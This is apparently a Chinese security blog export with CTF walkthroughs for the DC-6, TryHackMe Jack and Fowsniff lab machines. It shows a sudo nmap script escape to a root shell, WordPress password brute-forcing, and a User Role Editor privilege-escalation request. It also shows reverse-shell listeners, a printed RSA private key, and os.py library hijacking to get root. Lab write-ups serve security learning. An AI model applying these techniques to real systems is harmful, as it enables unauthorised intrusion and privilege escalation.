TF=$(mktemp)jens@dc-6:~$ echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27; &gt; $TFjens@dc-6:~$ sudo nmap --script=$TFStarting Nmap 7.40 ( https://nmap.org ) at 2023-06-03 18:14 AESTNSE: Warning: Loading &#x27;/tmp/tmp.tjVS1DLp9J&#x27; -- the recommended file extension is &#x27;.nse&#x27;.root@dc-6:/home/jens# \n\n成功提权。\n但此时的shell是有问题的，输入是没有显示的，所以我们盲打一个python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;重新spawn一个bash就可以了。\nroot@dc-6:~# root@dc-6:~# whoamirootroot@dc-6:~# uname -aLinux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linuxroot@dc-6:~# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host        valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000    link/ether 08:00:27:e1:6f:2c brd ff:ff:ff:ff:ff:ff    inet 192.168.56.115/24 brd 192.168.56.255 scope global eth0       valid_lft forever preferred_lft forever    inet6 fe80::a00:27ff:fee1:6f2c/64 scope link        valid_lft forever preferred_lft foreverroot@dc-6:~# cat theflag.txtYb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b  Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P   YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#x27;    YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) Congratulations!!!Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7.root@dc-6:~#\n\n完成。\n","categories":["vulnhub"],"tags":["walkthrough","DC"]},{"title":"[THM]  Jack","url":"/2023/06/07/Jack/","content":"\n\n\n简介TryHackMe上的hard难度靶机。给我们提供了一个WordPress普通权限用户提权的思路：利用User Role Editor插件的漏洞，此漏洞广泛存在所以挺有价值的。提权部分用到了python库注入方法，也是一种好思路,值得学习。\n记得开始前在hosts里面加上jack.thm对应的ip，不然网页可能无法正常加载。\n信息收集端口扫描：\n┌──(kali㉿kali)-[~/THM/Jack/workSpace]└─$ sudo nmap -p- --min-rate=10000 10.10.183.69  [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 14:36 CSTNmap scan report for 10.10.183.69Host is up (0.26s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 12.85 seconds\n\n省流：22，80\nTCP、服务、OS扫描：\n┌──(kali㉿kali)-[~/THM/Jack/workSpace]└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.183.69   Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 14:37 CSTNmap scan report for 10.10.183.69Host is up (0.25s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 3e7978089331d0837fe2bcb614bf5d9b (RSA)|   256 3a679faf7e66fae3f8c754496338a293 (ECDSA)|_  256 8cef55b023732c14094522ac84cb40d2 (ED25519)80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-generator: WordPress 5.3.2| http-robots.txt: 1 disallowed entry |_/wp-admin/|_http-title: Jack&amp;#039;s Personal Site &amp;#8211; Blog for Jacks writing adven...Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 7.1.1 - 7.1.2 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 30.27 seconds\n\n关键信息：WordPress\nnmap脚本漏扫：\n┌──(kali㉿kali)-[~/THM/Jack/workSpace]└─$ sudo nmap --script=vuln 10.10.183.69         Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 14:40 CSTNmap scan report for 10.10.183.69Host is up (0.27s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  http| http-slowloris-check: |   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.|       |     Disclosure date: 2009-09-17|     References:|       http://ha.ckers.org/slowloris/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750| http-wordpress-users: | Username found: jack| Username found: wendy| Username found: danny|_Search stopped at ID #25. Increase the upper limit if necessary with &#x27;http-wordpress-users.limit&#x27;|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-enum: |   /wp-login.php: Possible admin folder|   /wp-json: Possible admin folder|   /robots.txt: Robots file|   /readme.html: Wordpress version: 2 |   /: WordPress version: 5.3.2|   /wp-includes/images/rss.png: Wordpress version 2.2 found.|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.|   /wp-login.php: Wordpress login page.|   /wp-admin/upgrade.php: Wordpress login page.|   /readme.html: Interesting, a readme.|_  /0/: Potentially interesting folder| http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.183.69|   Found the following possible CSRF vulnerabilities: |     |     Path: http://10.10.183.69:80/|     Form id: search|_    Form action: http://jack.thmNmap done: 1 IP address (1 host up) scanned in 350.71 seconds\n\n省流:给我们枚举出了wordpress的三个用户名以及一些目录\nnikto：\n┌──(kali㉿kali)-[~/THM/Jack/workSpace]└─$ sudo nikto -h http://10.10.183.69[sudo] password for kali: - Nikto v2.5.0---------------------------------------------------------------------------+ Target IP:          10.10.183.69+ Target Hostname:    10.10.183.69+ Target Port:        80+ Start Time:         2023-06-06 15:56:18 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.18 (Ubuntu)+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options+ /: Drupal Link header found with value: &lt;http://jack.thm/index.php/wp-json/&gt;; rel=&quot;https://api.w.org/&quot;. See: https://www.drupal.org/+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/+ /FwkQXLWd.: Uncommon header &#x27;x-redirect-by&#x27; found, with contents: WordPress.+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ /robots.txt: contains 2 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can&#x27;t connect (timeout): Operation now in progress+ Scan terminated: 20 error(s) and 7 item(s) reported on remote host+ End Time:           2023-06-06 16:19:09 (GMT8) (1371 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n没啥多的信息而且扫了贼久，估计是网的原因。\nweb渗透所有信息都指向wordpress了。先wpscan扫一下。\n┌──(kali㉿kali)-[~/THM/Jack/workSpace]└─$ sudo wpscan --url http://jack.thm -e[sudo] password for kali: _______________________________________________________________         __          _______   _____         \\ \\        / /  __ \\ / ____|          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | &#x27;_ \\            \\  /\\  /  | |     ____) | (__| (_| | | | |             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|         WordPress Security Scanner by the WPScan Team                         Version 3.8.22       Sponsored by Automattic - https://automattic.com/       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://jack.thm/ [10.10.183.69][+] Started: Tue Jun  6 15:01:47 2023Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100%[+] robots.txt found: http://jack.thm/robots.txt | Interesting Entries: |  - /wp-admin/ |  - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://jack.thm/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://jack.thm/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://jack.thm/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18). | Found By: Rss Generator (Passive Detection) |  - http://jack.thm/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt; |  - http://jack.thm/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.3.2&lt;/generator&gt;[+] WordPress theme in use: online-portfolio | Location: http://jack.thm/wp-content/themes/online-portfolio/ | Last Updated: 2021-07-30T00:00:00.000Z | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt | [!] The version is out of date, the latest version is 0.1.0 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2 | Style Name: Online Portfolio | Style URI: https://www.amplethemes.com/downloads/online-protfolio/ | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag... | Author: Ample Themes | Author URI: https://amplethemes.com/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Css Style In 404 Page (Passive Detection) | | Version: 0.0.7 (80% confidence) | Found By: Style (Passive Detection) |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: &#x27;Version: 0.0.7&#x27;[+] Enumerating Vulnerable Plugins (via Passive Methods)[i] No plugins Found.[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:31 &lt;=============&gt; (500 / 500) 100.00% Time: 00:00:31[+] Checking Theme Versions (via Passive and Aggressive Methods)[i] No themes Found.[+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:02:38 &lt;===========&gt; (2575 / 2575) 100.00% Time: 00:02:38[i] No Timthumbs Found.[+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:09 &lt;==============&gt; (137 / 137) 100.00% Time: 00:00:09[i] No Config Backups Found.[+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:04 &lt;====================&gt; (71 / 71) 100.00% Time: 00:00:04[i] No DB Exports Found.[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:06 &lt;=========&gt; (100 / 100) 100.00% Time: 00:00:06[i] No Medias Found.[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:02 &lt;===============&gt; (10 / 10) 100.00% Time: 00:00:02[i] User(s) Identified:[+] jack | Found By: Rss Generator (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] wendy | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] danny | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Tue Jun  6 15:05:49 2023[+] Requests Done: 3444[+] Cached Requests: 11[+] Data Sent: 910.723 KB[+] Data Received: 1.393 MB[+] Memory used: 266.402 MB[+] Elapsed time: 00:04:01\n\n出来的信息还是用户名。\nWP-爆破先cewl根据网站信息生成一下字典，看看能不能成。\ncewl http://jack.thm &gt; cewlpass\n再用wpscan爆破一下,然而没有成功。\n那就只能试试rockyou.txt这个字典了，先后台挂着sudo wpscan --url http://jack.thm -U user -P /usr/share/wordlists/rockyou.txt\n那我们就手动看看网页吧。\n\n经典wordpress站，看了下感觉只有login页面对我们最有用，然而后台用rockyou爆破太慢了，而且因为网络原因经常请求超时，thm的openvpn节点不是很稳定。\nError: Request timed out.                                                   Error: Request timed out.                                                   Error: Request timed out.                                                   Error: Request timed out.                                                   trying jack / hamilton Time: 00:17:18 &lt;             &gt; (5995 / 43033176)  0.01%  ETA: ??:??:??\n\n那就再拿个小点的字典试试吧，kali自带的字典还有一个fasttrack，试试这个吧。\n等了一会，发现爆破出了wendy的密码。\n┌──(kali㉿kali)-[~/THM/Jack/workSpace]└─$ sudo wpscan --url http://jack.thm -U user -P /usr/share/wordlists/fasttrack.txt [sudo] password for kali: _______________________________________________________________         __          _______   _____         \\ \\        / /  __ \\ / ____|          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | &#x27;_ \\            \\  /\\  /  | |     ____) | (__| (_| | | | |             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|         WordPress Security Scanner by the WPScan Team                         Version 3.8.22       Sponsored by Automattic - https://automattic.com/       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[+] URL: http://jack.thm/ [10.10.183.69][+] Started: Tue Jun  6 16:26:36 2023[+] Performing password attack on Xmlrpc against 3 user/s[SUCCESS] - wendy / changelater                                                              Trying danny / starwars Time: 00:01:54 &lt;=============     &gt; (646 / 868) 74.42%  ETA: ??:??:??[!] Valid Combinations Found: | Username: wendy, Password: changelater[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Tue Jun  6 16:28:55 2023[+] Requests Done: 818[+] Cached Requests: 7[+] Data Sent: 371.288 KB[+] Data Received: 610.033 KB[+] Memory used: 244.953 MB[+] Elapsed time: 00:02:18\n\n我们当然先用wendy / changelater试试ssh登录，然而不行，那就先等进后台吧。\n看了一圈也没啥发现，就是一个普通用户，也没有什么其他的plugin。看看hint：ure_other_roles查了一下，发现这是个USER ROLE PLUGIN插件，基本是wordpress后台自带的插件。\n我们查一下exp-db，发现有一个用ruby写的可以在metasploit用的exp。但是懒得开msf了，其实手动方法也很简单，网上也有相关资料WordPress Plugin User Role Editor &lt; 4.24 - Privilege Escalation。\n我们直接来手动利用。\nWP-PLUGIN URE exploit这个漏洞是否存在识别起来其实有点玄学，因为URE插件版本一般看不出来，但是我们都可以尝试，只要在后台侧边栏有user或者profile用于让用户修改自己的profile，我们就可以试试。毕竟现在这个插件最先也就4.6版本，小于4.24都能用。\n我们先点击页面里的update按钮，这会生成一个请求：\n\n此时，我们在POST请求最后加上&amp;ure_other_roles=administrator把自己编辑成为管理员：\n\n然后就能成功升级成管理员权限。这个漏洞的原因是URE插件对于用户更新profile时没有进行严格的身份验证，这就导致了用户可以将自己添加为管理员。\n而当我们拿到了wordpress的管理员权限，事情一下就简单了起来。因为有我们最喜欢的theme edit以及plugin upload拿shell方法。\n上传反弹shell然而，在我们直接编辑主题模版时，会出现错误，让我们无法成功编辑。\n无所谓，插件安装会出手。\n我们直接编辑好反弹shell，传上去。\n\n上传好后在/wp-content/uploads里面就能找到。\n\n直接访问就能拿到shell。\n┌──(kali㉿kali)-[~/THM/Jack/workSpace]└─$ sudo nc -lvp 443                 [sudo] password for kali: listening on [any] 443 ...connect to [10.11.40.37] from jack.thm [10.10.183.69] 34350bash: cannot set terminal process group (1123): Inappropriate ioctl for devicebash: no job control in this shellwww-data@jack:/var/www/html/wp-content/uploads/2023/06$ uname -auname -aLinux jack 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linuxwww-data@jack:/var/www/html/wp-content/uploads/2023/06$\n\n成功拿shell，userflag在jack的home目录下，且可以直接查看。\n提权www-data的权限一如既往的不理想，不知道密码，sudo -l用不了，也没有啥SUID可用的二进制文件，单看定时任务也没有什么特别的。\n手动枚举先看/home目录，里面只有一个用户jack。看看他的home目录。\nwww-data@jack:/home/jack$ ls -lals -latotal 36drwxr-xr-x 4 jack jack 4096 Jan 10  2020 .drwxr-xr-x 3 root root 4096 Jan  8  2020 ..lrwxrwxrwx 1 jack jack    9 Jan 10  2020 .bash_history -&gt; /dev/null-rw-r--r-- 1 jack jack  220 Jan  8  2020 .bash_logout-rw-r--r-- 1 jack jack 3771 Jan  8  2020 .bashrcdrwx------ 2 jack jack 4096 Jan  9  2020 .cache-rw-r--r-- 1 jack jack  655 Jan  8  2020 .profiledrwx------ 2 jack jack 4096 Jan 10  2020 .ssh-rw-r--r-- 1 root root  140 Jan 10  2020 reminder.txt-rw-rw-r-- 1 jack jack   33 Jan 10  2020 user.txtwww-data@jack:/home/jack$ cat user      cat user.txt ********************************www-data@jack:/home/jack$ cat re cat reminder.txt Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.www-data@jack:/home/jack$ cat .bash_historycat .bash_historywww-data@jack:/home/jack$ \n\nreminder给我们带来了很重要的信息，系统里面有个B喜欢备份重要文件。那我们直奔/var/backups看看。\nwww-data@jack:/var/backups$ ls -lals -latotal 776drwxr-xr-x  2 root root     4096 Jan 10  2020 .drwxr-xr-x 14 root root     4096 Jan  9  2020 ..-rw-r--r--  1 root root    40960 Jan  9  2020 alternatives.tar.0-rw-r--r--  1 root root     9931 Jan  9  2020 apt.extended_states.0-rw-r--r--  1 root root      713 Jan  8  2020 apt.extended_states.1.gz-rw-r--r--  1 root root       11 Jan  8  2020 dpkg.arch.0-rw-r--r--  1 root root       43 Jan  8  2020 dpkg.arch.1.gz-rw-r--r--  1 root root      437 Jan  8  2020 dpkg.diversions.0-rw-r--r--  1 root root      202 Jan  8  2020 dpkg.diversions.1.gz-rw-r--r--  1 root root      207 Jan  9  2020 dpkg.statoverride.0-rw-r--r--  1 root root      129 Jan  8  2020 dpkg.statoverride.1.gz-rw-r--r--  1 root root   552673 Jan  9  2020 dpkg.status.0-rw-r--r--  1 root root   129487 Jan  8  2020 dpkg.status.1.gz-rw-------  1 root root      813 Jan 10  2020 group.bak-rw-------  1 root shadow    679 Jan 10  2020 gshadow.bak-rwxrwxrwx  1 root root     1675 Jan 10  2020 id_rsa-rw-------  1 root root     1626 Jan  9  2020 passwd.bak-rw-------  1 root shadow   1066 Jan 10  2020 shadow.bakwww-data@jack:/var/backups$ cat id_rsacat id_rsa-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEAxfBR9F9V5G2snv1Xaaxv3VHbFZ2VZRwGyU+ah6komBeaAldr8SNK1x0wu/eXjLjrWnVaYOEU2YUrHzn/duB3Wvm8xyA0T8x/WbV2osWaVOafkPSvYpV4OdQrdRoS3PEOXRnS+CnOTAgPWo2+xfH1XeldFw9XiYrprTugmwCcYDuBZB3rzmWA8sPWjLjs6xzNK26RQQbo9zaxwfEdjZ3an9JngJJ7m0rtF9vKeCRfO1V8sd/t1lu96Kqn4FZUTXQFEGfAYupG6b3vpRwqmI6y2VjK5MxlMmEdwP8oxmKR4XRqvSK18m5byz8ZUu1RfB8Ug/pKK9VVbk9QFWbrV4E3FwIDAQABAoIBAEEr0TAOu68MVUu7yi4m8mYCb4n8apXx1mIt7YlBLvZ0vuaKdiXdIuUU3VjmOmXA9OzButIvCbhc2kfbxrsTSPkRRRCjD9Y+VKfq0XbibOALVvpZNe3VnNIdg3l47kEEtV/+ArJmwV/TP4rnJKrz8X/MODRBfubwb+Pzv/uJBfPAzvkokKUp9D2LqNjQEY4w71j0yUl+A0xnkT4iL1FbzghdARExy2cJN0RfdDKhy/DfXos7+JHso3ZvXmSx0ivS+HyCblO25Kcmy4VhFZotNk+28iw6DKm1wrgAjj0sdLpB6jW9+M/kSQCovMijPM8h8JNPLNOJMFSKWBH8m9US/XECgYEA+AW0bbMVoylAcWGold85Ileyuw/q3HwsDdRrO43uMZvQe8f5TRsdQ9SvAEz9T46YErySq33jOPmsGLf02EEiyGggpBiuhi3FmtMa7440qGFig4Q5IVxnQuSDUQvxN/uVE+TZxlRPTUeAFPcAI4DAUYbubAcJzvXeAsCPsKbQGw0CgYEAzE42H8SUWiCMXBMotEUpn14pGcP4O+hei9j7P1Nupy/F63UtYPvXN4oi75YeLiInUXzUS/r3+AxoNafMAy67oQhLKHXs+NOP5aEkVhNDhHFNpWutYPn9aLWUIx1tXbWsaecEi7OCxjp0L5lDRVl3TLzXeZmtp0oSAPKNRYmgQbMCgYAvL0aoKA3RwKNV7rJX8OO5uN1z4Q9ZavYmm2bbKaFLJs1+/whatvHWWbwBXqRCYmpkBiQRJB36VOV8vmKCUcIARm8PSPLK7CJP1iGluXQjJIPNaXZE9oNeooKpBJCbie1On5ceuCNuHFAtrOAF4RS1beol+yDOks/tzhyICvREcQKBgCHIiRClu/ZPTYZoMKHmkeRleJxnGGQnn4K2hY1KKZEByFOQE8nmuwbXE8HUa/cq9J936c8Kl/hvbMf6kDSyhJozOeJd5aqbqT7Kb6zAELkU10cUUB4qGGo5JF7OHeiSAwmcBtdm/qfywIWibUpJaf3JeEQGUn3INMPtV8j44gQbAoGBAKuXPITKuO7SsRfXcwB3MO3iCTLdW7BYnYF1SzVbPBonmcsxlQinvoRg2faWmSFAUK6cIys9za3pzOw3FP8W9Q5SGsA9KriSYj6/h7ei9GeJAr3mxlbGnkZNZFqUVe2Jvxq++O6Ub41zUtWINbR5Fxf+kTlJIIwqc6IuzZq+QWXy-----END RSA PRIVATE KEY-----\n\n喜提ssh登录密钥。\n尝试了下root没有成功（当然没这么简单），那就只剩下jack这个选项了，成功登录。\nssh jack@10.10.237.140 -i root_rsa\n\npython库注入然而因为我们是ssh登录的jack用户，并不知道密码，sudo -l显然是用不了了。在我们四处查看下，发现了/opt下有东西，还是python文件，这不是很寻常。一般这里应没啥东西才对。（你问我为啥要看的&#x2F;opt的话是因为以前打的靶机里面就有藏B喜欢在这个目录下藏东西，只能说是吃一堑长一智了，反正就ls一下的事）没有这个思路的话其实用linpeas扫一下也会报给你&#x2F;opt下有不常见目录，看一下就好。\n\n然而这个checker.py文件当前用户只能看，不能读和执行，看看内容吧那就。\njack@jack:/opt/statuscheck$cat checker.pyimport osos.system(&quot;/usr/bin/curl -s -I http://127.0.0.1 &gt;/opt/statuscheck/output.log&quot;)\n\n内容就是向同目录下的output.log写入。我们查看output.log文件发现其内容是每隔一段时间就更新一次。所以checker的作用就是定时写入日志，而且显然是以root身份执行的。找了一下也不知道这个定时任务到底如何触发，在哪执行的。但是我们能知道的是他一定是定时在执行。\n可是我们也没有权限修改这个文件，并且curl也是绝对路径写的，想利用PATH估计是没戏的，而且我们大概率改不了/usr/bin的curl文件。难道这条路走不通吗。\n不死心，在搜索引擎查一下root权限的python文件如何利用。\n\n发现有博客提供了几种python文件提权的方式。\n提到了库劫持。\n文件中import了os库，我们试试能不能劫持。\n我们先寻找os库文件位置以及查看是否有权限，因为一般而言这些目录多半只有root才能编辑。\njack@jack:/opt/statuscheck$locate os.py/usr/lib/python2.7/os.py/usr/lib/python2.7/os.pyc/usr/lib/python2.7/encodings/palmos.py/usr/lib/python2.7/encodings/palmos.pyc/usr/lib/python3/dist-packages/LanguageSelector/macros.py/usr/lib/python3.5/os.py/usr/lib/python3.5/encodings/palmos.pyjack@jack:/opt/statuscheck$ls -l /usr/lib/python2.7/os.py-rw-rw-r-x 1 root family 25908 Nov 16 2020 /usr/lib/python2.7/os.pyjackajack:/opt/statuscheck$iduid=1000(jack)gid=1000(jack)groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin)116(sambashare),1001(family)\n\n我们发现竟然family组就能编辑os库文件，而jack用户正好是该组的用户。那我们直接vim往os库里注入我们的反弹shell，这样checker.py调用库的时候就会给我们弹回反弹root shell。按理来说，我们应该在os库里system函数中注入我们的payload，然而我找了半天没找到在哪，所以只能写在最后试试了。\n\n写完之后可以用tail -f output.log实时查看文件有没有更新，如果更新了就说明checker执行了， 那应该就会给我们弹回来shell。\n\n┌──(kali㉿kali)-[~/THM/Jack/workSpace]└─$ sudo nc -lvp 8080[sudo] password for kali: listening on [any] 8080 ...connect to [10.8.134.236] from jack.thm [10.10.237.140] 43558bash: cannot set terminal process group (2730): Inappropriate ioctl for devicebash: no job control in this shellroot@jack:~# ls -lals -latotal 28drwxr-x--x  4 root root 4096 Nov 16  2020 .drwxr-xr-x 23 root root 4096 Jan  8  2020 ..lrwxrwxrwx  1 root root    9 Jan 10  2020 .bash_history -&gt; /dev/null-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrcdrwx------  2 root root 4096 Nov 16  2020 .cache-rw-r--r--  1 root root  148 Aug 17  2015 .profile-r--------  1 root root   33 Jan 10  2020 root.txtdrwxr-xr-x  2 root root 4096 Nov 16  2020 .sshroot@jack:~# cat root.txtcat root.txt*****************************root@jack:~#\n\n成功拿到root flag。\n","categories":["TryHackMe"],"tags":["walkthrough","THM"]},{"title":"[vulnhub]  Fowsniff","url":"/2023/05/26/Fowsniff/","content":"\n\n\n简介非常好靶机，好的工作，爱来自中间的国家。\n这台靶机主要考信息收集能力，场景设计的也很好，很真实，推荐动手尝试。\n信息收集nmap及脚本扫描主机发现\n┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ sudo nmap -sn 192.168.56.0/24                          [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 23:09 CSTNmap scan report for 192.168.56.1Host is up (0.00030s latency).MAC Address: 0A:00:27:00:00:08 (Unknown)Nmap scan report for 192.168.56.100Host is up (0.00014s latency).MAC Address: 08:00:27:2E:A1:5A (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.107Host is up (0.00032s latency).MAC Address: 08:00:27:B0:22:14 (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.144Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 9.88 seconds                                                                            \n\n端口扫描\n┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.107Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 23:09 CSTStats: 0:01:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 90.33% done; ETC: 23:11 (0:00:11 remaining)Stats: 0:03:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 99.99% done; ETC: 23:12 (0:00:00 remaining)Warning: 192.168.56.107 giving up on port because retransmission cap hit (10).Nmap scan report for 192.168.56.107Host is up (0.0060s latency).Not shown: 37408 filtered tcp ports (no-response), 28123 closed tcp ports (reset)PORT    STATE SERVICE22/tcp  open  ssh80/tcp  open  http110/tcp open  pop3143/tcp open  imapMAC Address: 08:00:27:B0:22:14 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 248.28 seconds                                                                            \n\n开了4个端口，都比较有用。就端口扫描来说看起来80是一条路，110和143是另一条路，22是最后考虑的。先看接下来的扫描再说吧。\nTCP扫描 服务探测 OS探测\n┌──(kali㉿kali)-[~/vulnhub/Fowsniff/workSpace]└─$ sudo nmap -sT -sV -sC -O -p22,80,110,143 192.168.56.107Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 23:14 CSTNmap scan report for 192.168.56.107Host is up (0.00050s latency).PORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 903566f4c6d295121be8cddeaa4e0323 (RSA)|   256 